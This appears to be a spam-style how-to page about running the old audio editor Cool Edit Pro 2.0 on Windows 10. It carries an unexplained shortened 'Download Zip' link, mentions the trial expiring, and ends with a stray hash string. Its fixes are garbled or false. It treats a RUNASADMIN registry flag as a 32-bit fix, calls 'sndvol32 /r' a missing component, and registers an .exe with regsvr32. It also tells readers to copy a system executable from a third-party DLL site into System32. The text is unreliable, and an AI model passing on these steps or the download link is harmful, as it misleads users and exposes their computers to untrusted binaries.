
 
# How to Fix Cool Edit Pro 2.0 on Windows 10
 
Cool Edit Pro 2.0 is a popular audio editing software that was released in 2002. However, many users have reported problems with running it on Windows 10, such as getting an error message about missing sndvol32 /r or having the trial version expire. In this article, we will show you some possible solutions to fix these issues and enjoy Cool Edit Pro 2.0 on your Windows 10 computer.
 
## Method 1: Modify the Registry
 
One of the reasons why Cool Edit Pro 2.0 may not work on Windows 10 is that it is incompatible with the 64-bit architecture of the operating system. To solve this, you can try modifying the registry to make Cool Edit Pro 2.0 run as a 32-bit application. Here are the steps:
 
**Download Zip … [https://t.co/86cn7rQ9Cj](https://t.co/86cn7rQ9Cj)**


 
1. Open the Start menu and type regedit in the search box. Click on the Registry Editor app to launch it.
2. Navigate to the following key: HKEY\_LOCAL\_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers
3. Right-click on an empty space and select New > String Value.
4. Name the new value as the path of your Cool Edit Pro 2.0 executable file, for example C:\Program Files (x86)\Cool Edit Pro 2.0\CoolEditPro.exe
5. Double-click on the new value and enter ~ RUNASADMIN in the Value data field. Click OK to save it.
6. Close the Registry Editor and restart your computer.
7. Try running Cool Edit Pro 2.0 again and see if it works.

## Method 2: Install sndvol32 /r
 
Another reason why Cool Edit Pro 2.0 may not work on Windows 10 is that it requires sndvol32 /r, which is a mixer program that is not available on Windows 10 by default. To solve this, you can try installing sndvol32 /r from an older version of Windows, such as Windows XP. Here are the steps:

1. Download sndvol32.exe from a trusted source, such as [this website](https://www.dll-files.com/sndvol32.exe.html).
2. Copy sndvol32.exe to C:\Windows\System32 folder.
3. Open the Start menu and type cmd in the search box. Right-click on the Command Prompt app and select Run as administrator.
4. Type cd C:\Windows\System32 and press Enter.
5. Type regsvr32 sndvol32.exe and press Enter.
6. You should see a message saying that sndvol32.exe was registered successfully.
7. Close the Command Prompt and restart your computer.
8. Try running Cool Edit Pro 2.0 again and see if it works.

## Method 3: Use a Different Audio Editing Software
 
If none of the above methods work for you, or if you find them too complicated or risky, you may want to consider using a different audio editing software that is compatible with Windows 10 and has similar or better features than Cool Edit Pro 2.0. Some of the alternatives you can try are:

- [Adobe Audition](https://www.adobe.com/products/audition.html): This is the successor of Cool Edit Pro, which was acquired by Adobe in 2003. It has a professional-level audio editing and mixing capabilities, as well as integration with other Adobe products.
- [Audacity](https://www.audacityteam.org/): This is a free and open-source audio editing software that has a simple and user-friendly interface, as well as a variety of effects and plugins.
- [Ocenaudio](https://www.ocenaudio.com/): This is another free and easy-to-use audio editing software that has a fast and responsive performance, as well as support for multiple formats and platforms.
8cf37b1e13


